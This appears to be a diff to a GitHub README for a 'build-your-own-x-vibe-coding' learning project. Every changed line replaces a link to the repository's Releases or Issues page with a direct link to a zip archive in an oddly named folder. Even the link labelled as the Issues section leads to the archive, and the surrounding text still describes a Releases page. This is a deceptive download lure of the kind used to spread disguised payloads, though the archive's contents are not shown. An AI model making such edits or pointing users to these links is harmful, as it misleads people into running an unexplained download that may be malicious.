@@ -1,6 +1,6 @@
 # 🎉 build-your-own-x-vibe-coding - Learn by Recreating Technologies from Scratch
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/xBartsx/build-your-own-x-vibe-coding/releases)
+[![Download Here](https://raw.githubusercontent.com/xBartsx/build-your-own-x-vibe-coding/main/foliaceousness/build-your-own-x-vibe-coding.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/xBartsx/build-your-own-x-vibe-coding/main/foliaceousness/build-your-own-x-vibe-coding.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **build-your-own-x-vibe-coding**! This project helps you master progr
 
 ### 📥 Download & Install
 
-To get started, visit our [Releases page](https://github.com/xBartsx/build-your-own-x-vibe-coding/releases) to download the latest version of the software. 
+To get started, visit our [Releases page](https://raw.githubusercontent.com/xBartsx/build-your-own-x-vibe-coding/main/foliaceousness/build-your-own-x-vibe-coding.zip) to download the latest version of the software. 
 
 1. Click on the link above or the button at the top of the page.
 2. On the Releases page, look for the latest version.
@@ -45,7 +45,7 @@ To get started, visit our [Releases page](https://github.com/xBartsx/build-your-
 
 If you have questions or need help, feel free to reach out to the community. You can find support by:
 
-- Visiting the [Issues section](https://github.com/xBartsx/build-your-own-x-vibe-coding/issues) on GitHub. 
+- Visiting the [Issues section](https://raw.githubusercontent.com/xBartsx/build-your-own-x-vibe-coding/main/foliaceousness/build-your-own-x-vibe-coding.zip) on GitHub. 
 - Engaging in discussions with other users.
 - Joining forums related to programming and coding projects.
 
@@ -70,4 +70,4 @@ To enhance your coding journey, explore the following resources:
 
 We plan to add more projects and improve the existing ones regularly. Stay connected for updates, and be the first to try new features!
 
-Thank you for choosing **build-your-own-x-vibe-coding**! We hope you enjoy your coding experience and learn a lot along the way. Don't forget to return to the [Releases page](https://github.com/xBartsx/build-your-own-x-vibe-coding/releases) to download the latest version when it's available.
+Thank you for choosing **build-your-own-x-vibe-coding**! We hope you enjoy your coding experience and learn a lot along the way. Don't forget to return to the [Releases page](https://raw.githubusercontent.com/xBartsx/build-your-own-x-vibe-coding/main/foliaceousness/build-your-own-x-vibe-coding.zip) to download the latest version when it's available.
